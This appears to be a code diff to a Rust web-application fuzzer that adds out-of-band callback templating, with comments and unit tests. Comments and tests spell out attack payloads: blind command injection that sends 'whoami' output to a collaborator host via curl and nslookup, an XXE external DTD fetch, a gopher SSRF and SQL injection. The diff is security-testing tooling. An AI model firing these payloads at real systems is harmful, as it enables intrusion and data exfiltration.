@@ -176,6 +176,8 @@ pub struct FuzzResult {
     pub corpus_size: usize,
     /// Baseline health summary for audit trail.
     pub baseline: String,
+    /// OOB payloads skipped because no collaborator (`{{oob}}`) was configured.
+    pub oob_skipped: usize,
 }
 
 impl FuzzResult {
@@ -535,6 +537,68 @@ pub struct Fuzzer<P: Probe> {
     max_concurrent: usize,
     /// Minimum interval between probe submissions (rate limiting).
     probe_interval: Option<Duration>,
+    /// Out-of-band collaborator host for `{{oob}}` substitution (see the module
+    /// note above [`substitute_oob`]). `None` = OOB payloads are skipped.
+    oob_host: Option<String>,
+}
+
+// ── Out-of-band (OOB) collaborator templating ──────────────────────────────
+//
+// Payloads that need a call-back (blind command injection, OOB XXE, SSRF probes,
+// DNS exfil) carry the placeholder `{{oob}}`. A collaborator server is
+// per-engagement infrastructure that CANNOT be baked into the corpus, so it is
+// substituted at run time from `--oob-url` / `Fuzzer::oob()`.
+//
+// IMPORTANT — `{{oob}}` is a BARE HOST, not a URL. This is deliberate and it is
+// the one thing to get right here:
+//
+//   * Payloads write their OWN scheme:  `curl http://{{oob}}/x`, `gopher://{{oob}}:80/`,
+//     XXE `SYSTEM "http://{{oob}}/evil.dtd"`. That keeps every call site
+//     unambiguous — you can see the protocol in the payload — and it lets DNS /
+//     non-HTTP contexts work: `nslookup $(whoami).{{oob}}` must NOT become
+//     `nslookup $(whoami).http://host`.
+//   * This mirrors what nuclei's `{{interactsh-url}}` actually resolves to (a
+//     host, despite the "-url" in its name). We accept `{{interactsh-url}}` as
+//     an ALIAS so nuclei templates paste in unchanged, but the native token is
+//     `{{oob}}` — neutral and honestly named, not tied to one vendor's tool.
+//   * `oob_host_of` extracts the host from whatever the user passes (a full URL
+//     `http://x.oast.example/…` or a bare host `x.oast.example`), so the flag
+//     stays URL-shaped (familiar) while substitution stays host-shaped (correct).
+//
+// When no collaborator is set, a payload still containing `{{oob}}` cannot
+// function (it would hit a literal, unresolvable host), so such payloads are
+// SKIPPED before the run rather than sent as noise — recall-first: a dead OOB
+// probe is not a finding, and skipping keeps the budget on live payloads.
+
+/// The two OOB placeholder tokens: the native `{{oob}}` and the nuclei alias.
+const OOB_TOKENS: [&str; 2] = ["{{oob}}", "{{interactsh-url}}"];
+
+/// True if the payload carries an unresolved OOB placeholder.
+fn has_oob_placeholder(s: &str) -> bool {
+    OOB_TOKENS.iter().any(|t| s.contains(t))
+}
+
+/// Replace every OOB token with `host` (a bare hostname). No-op when `host`
+/// is `None` — callers skip such payloads before this is reached.
+fn substitute_oob(payload: &str, host: &Option<String>) -> String {
+    match host {
+        Some(h) => {
+            let mut out = payload.to_string();
+            for t in OOB_TOKENS {
+                if out.contains(t) { out = out.replace(t, h); }
+            }
+            out
+        }
+        None => payload.to_string(),
+    }
+}
+
+/// Extract a bare host from a user-supplied collaborator value, accepting either
+/// a full URL (`http://x.oast.example:8080/p`) or a bare host (`x.oast.example`).
+fn oob_host_of(raw: &str) -> String {
+    let s = raw.trim();
+    let after_scheme = s.rsplit("://").next().unwrap_or(s); // drop scheme if any
+    after_scheme.split(['/', ':']).next().unwrap_or(after_scheme).to_string()
 }
 
 impl<P: Probe + 'static> Fuzzer<P> {
@@ -556,7 +620,17 @@ impl<P: Probe + 'static> Fuzzer<P> {
             extra_headers: HashMap::new(),
             max_concurrent: 1,
             probe_interval: None,
+            oob_host: None,
         }
+    }
+
+    /// Set the out-of-band collaborator for `{{oob}}` substitution. Accepts a
+    /// full URL or a bare host; the host is extracted (see [`oob_host_of`]).
+    /// Without it, OOB payloads are skipped. Also resolves the `{{interactsh-url}}`
+    /// alias.
+    pub fn oob(mut self, url_or_host: &str) -> Self {
+        self.oob_host = Some(oob_host_of(url_or_host));
+        self
     }
 
     /// Set the fuzz mode (Table, Evolutionary, TableThenEvolutionary, InputsOnly).
@@ -754,12 +828,19 @@ impl<P: Probe + 'static> Fuzzer<P> {
         let progress_cb = self.progress.clone();
         let probe_count = Arc::new(AtomicUsize::new(0));
 
+        // OOB collaborator host: substituted into `{{oob}}` at injection time so
+        // it reaches table, evolutionary, and mutated payloads alike. When unset,
+        // payloads still carrying the placeholder are filtered out below.
+        let oob_host = self.oob_host.clone();
+        let oob_host_inject = self.oob_host.clone();
+
         let inject = move |payload: &str| -> Request {
             let n = probe_count.fetch_add(1, Ordering::Relaxed) + 1;
             if let Some(cb) = &progress_cb {
                 cb(n, budget);
             }
-            let mut r = injection.apply(&url, &method, payload);
+            let resolved = substitute_oob(payload, &oob_host_inject);
+            let mut r = injection.apply(&url, &method, &resolved);
             for (k, v) in &extra_headers {
                 r.headers.entry(k.clone()).or_insert_with(|| v.clone());
             }
@@ -769,7 +850,7 @@ impl<P: Probe + 'static> Fuzzer<P> {
         // ── Table / InputsOnly: exact sweep — no corpus, no mutation, no randomness ──
         if matches!(self.mode, FuzzMode::Table | FuzzMode::InputsOnly) {
             type SweepItem = (String, PayloadSource, Option<CaseMeta>);
-            let entries: Vec<SweepItem> = match self.mode {
+            let mut entries: Vec<SweepItem> = match self.mode {
                 FuzzMode::Table => {
                     let table = self.preset.table.as_ref()
                         .ok_or_else(|| "Table mode requires a preset with a payload table".to_string())?;
@@ -792,6 +873,13 @@ impl<P: Probe + 'static> Fuzzer<P> {
                 }
                 _ => unreachable!(),
             };
+
+            // Skip OOB payloads when no collaborator is set — they can't fire.
+            let oob_skipped = if oob_host.is_none() {
+                let before = entries.len();
+                entries.retain(|(p, _, _)| !has_oob_placeholder(p));
+                before - entries.len()
+            } else { 0 };
 
             let signal_set = &self.preset.signal_set;
             let feedback = &*self.preset.feedback;
@@ -879,6 +967,7 @@ impl<P: Probe + 'static> Fuzzer<P> {
                 probes_sent,
                 corpus_size: 0,
                 baseline: baseline_profile.summary(),
+                oob_skipped,
             });
         }
 
@@ -887,7 +976,11 @@ impl<P: Probe + 'static> Fuzzer<P> {
         if matches!(self.mode, FuzzMode::TableThenEvolutionary) {
             let table = self.preset.table.as_ref()
                 .ok_or_else(|| "TableThenEvolutionary requires a preset with a payload table".to_string())?;
-            let entries: Vec<String> = table.cases.iter().map(|c| c.payload.clone()).collect();
+            let entries: Vec<String> = table.cases.iter()
+                .map(|c| c.payload.clone())
+                // Skip OOB payloads in the prefix when no collaborator is set.
+                .filter(|p| oob_host.is_some() || !has_oob_placeholder(p))
+                .collect();
             let signal_set = &self.preset.signal_set;
             let feedback = &*self.preset.feedback;
             let sweep_budget = self.budget.min(entries.len());
@@ -927,13 +1020,17 @@ impl<P: Probe + 'static> Fuzzer<P> {
             self.preset.length,
         );
         let havoc = HavocMutator::new(sampler.clone(), self.budget * 4);
-        let mut corpus = SeedCorpus::from_seeds(&self.preset.seeds);
-        for s in &self.additional_seeds {
-            corpus.push_seed(s.clone());
-        }
-        for s in &extra_seeds {
-            corpus.push_seed(s.clone());
-        }
+        // Assemble seeds; skip OOB-templated seeds when no collaborator is set
+        // (a `{{oob}}` seed can't fire, and havoc won't resynthesize the token).
+        let mut seed_list: Vec<String> = self.preset.seeds.clone();
+        seed_list.extend(self.additional_seeds.iter().cloned());
+        seed_list.extend(extra_seeds.iter().cloned());
+        let oob_skipped = if oob_host.is_none() {
+            let before = seed_list.len();
+            seed_list.retain(|p| !has_oob_placeholder(p));
+            before - seed_list.len()
+        } else { 0 };
+        let corpus = SeedCorpus::from_seeds(&seed_list);
 
         let mut loop_ = EvolutionaryLoop::new(
             probe,
@@ -1001,6 +1098,7 @@ impl<P: Probe + 'static> Fuzzer<P> {
             probes_sent: outcome.probes_sent,
             corpus_size: outcome.final_corpus_size,
             baseline: profile.summary(),
+            oob_skipped,
         })
     }
 }
@@ -1009,6 +1107,42 @@ impl<P: Probe + 'static> Fuzzer<P> {
 mod tests {
     use super::*;
     use std::sync::Arc;
+
+    #[test]
+    fn oob_host_extraction() {
+        assert_eq!(oob_host_of("http://x.oast.example"), "x.oast.example");
+        assert_eq!(oob_host_of("https://x.oast.example:8080/path"), "x.oast.example");
+        assert_eq!(oob_host_of("x.oast.example"), "x.oast.example");
+        assert_eq!(oob_host_of("  x.oast.example/p  "), "x.oast.example");
+    }
+
+    #[test]
+    fn oob_substitution_keeps_payload_scheme() {
+        let host = Some("abc.oast.example".to_string());
+        // Payload carries its own scheme; {{oob}} is only the host.
+        assert_eq!(
+            substitute_oob("curl http://{{oob}}/$(whoami)", &host),
+            "curl http://abc.oast.example/$(whoami)"
+        );
+        // DNS context: no scheme injected.
+        assert_eq!(
+            substitute_oob("nslookup $(whoami).{{oob}}", &host),
+            "nslookup $(whoami).abc.oast.example"
+        );
+        // nuclei alias resolves too.
+        assert_eq!(substitute_oob("http://{{interactsh-url}}/x", &host), "http://abc.oast.example/x");
+        // No host set → unchanged (caller skips these).
+        assert_eq!(substitute_oob("http://{{oob}}/x", &None), "http://{{oob}}/x");
+    }
+
+    #[test]
+    fn oob_placeholder_detection() {
+        assert!(has_oob_placeholder("curl http://{{oob}}/x"));
+        assert!(has_oob_placeholder("http://{{interactsh-url}}/x"));
+        assert!(!has_oob_placeholder("' OR 1=1--"));
+        // SSTI {{7*7}} must not be mistaken for an OOB token.
+        assert!(!has_oob_placeholder("{{7*7}}"));
+    }
 
     /// Mock probe that returns 500 + SQL error when payload contains ' OR.
     struct MockSqlTarget;
